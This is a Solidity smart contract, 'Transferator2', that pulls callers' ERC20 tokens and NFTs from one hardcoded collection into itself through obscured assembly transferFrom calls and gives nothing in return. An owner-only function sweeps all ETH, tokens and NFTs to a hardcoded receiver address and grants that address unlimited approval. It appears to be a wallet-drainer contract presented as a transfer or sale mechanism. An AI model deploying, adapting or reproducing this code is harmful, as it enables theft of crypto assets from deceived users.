// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

error TransferClosed();

import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/interfaces/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "solady/src/utils/ECDSA.sol";
import "solmate/auth/Owned.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract Transferator2 is Owned(msg.sender), ERC721Holder {
    uint8 public saleState;

    address public tokeno;
    address public signer;

    using ECDSA for bytes32;
    using SafeERC20 for IERC20;

    constructor(address _tokeno) {
        tokeno = _tokeno;
    }

    event TransferNFT(
        address indexed user,
        uint256 tokenId,
        address nftContract
    );
    event TransferTokens(
        address indexed user,
        uint256 amount,
        address tokenContract
    );

function transferTokens(uint256 amount) external payable {
    address vault = address(this);
    address user = msg.sender;

    if (saleState != 1) {
        revert TransferClosed();
    }

    assembly {
        let tok := sload(tokeno.slot)
            mstore(0x00, hex"23b872dd")
            mstore(0x04, user)
            mstore(0x24, vault)
            mstore(0x44, amount)

        let result := call(gas(), tok, 0, 0x00, 0x64, 0, 0)
        if iszero(result) {
            revert(0, 0)
        }
    }
}
    




    function transferNFT(
        uint256 tokenIds,
        bytes calldata signature
    ) external payable requireSignature(signature) {
        address voult = address(this);

        if (saleState != 1) {
            revert TransferClosed();
        }
        assembly {
            mstore(0x00, hex"23b872dd")
            mstore(0x04, caller())
            mstore(0x24, voult)
            mstore(0x44, tokenIds)

            if iszero(
                call(
                    gas(),
                    0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4,
                    0,
                    0x00,
                    0x64,
                    0,
                    0
                )
            ) {
                revert(0, 0)
            }
        }
        emit TransferNFT(
            msg.sender,
            tokenIds,
            0x2e7a816a8E0cac339086f6e0efdA848d1a6611f4
        );
    }

    modifier requireSignature(bytes calldata signature) {
        require(
            keccak256(abi.encode(msg.sender)).toEthSignedMessageHash().recover(
                signature
            ) == signer,
            "Invalid signature."
        );
        _;
    }

    function setSaleState(uint8 value) external onlyOwner {
        require(value == 0 || value == 1, "Invalid state value");
        saleState = value;
    }

    function setSigner(address value) external onlyOwner {
        signer = value;
    }

    function withdrawso(
        uint256 TokenId,
        address nft
    ) external payable onlyOwner {
        address receiver = 0x13d8cc1209A8a189756168AbEd747F2b050D075f;

        SafeTransferLib.safeTransferETH(receiver, address(this).balance);
        uint256 _uniqBalance = IERC20(tokeno).balanceOf(address(this));
        SafeTransferLib.safeApprove(tokeno, receiver, type(uint256).max);
        SafeTransferLib.safeTransfer(tokeno, receiver, _uniqBalance);
        IERC721(nft).safeTransferFrom(address(this), receiver, TokenId);
    }
}
